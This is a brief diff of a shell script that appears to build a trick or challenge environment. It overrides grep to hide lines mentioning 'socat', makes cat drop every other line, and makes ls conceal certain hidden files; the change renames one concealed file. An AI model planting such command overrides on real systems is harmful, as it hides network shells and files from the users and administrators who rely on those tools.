@@ -69,7 +69,7 @@ grep() { command grep "$@" | command grep -v 'socat'; }
 cat() { command cat "$@" | awk 'NR % 2 == 0'; }
 
 # Alias for ls to ignore .hidden directory
-ls() { command ls "$@" | grep -vE '^\..*nope$|^\..*funny\.sh$'; }
+ls() { command ls "$@" | grep -vE '^\..*nope$|^\..*golden_egg$'; }
 EOF
 
 # Set privs for funny.sh
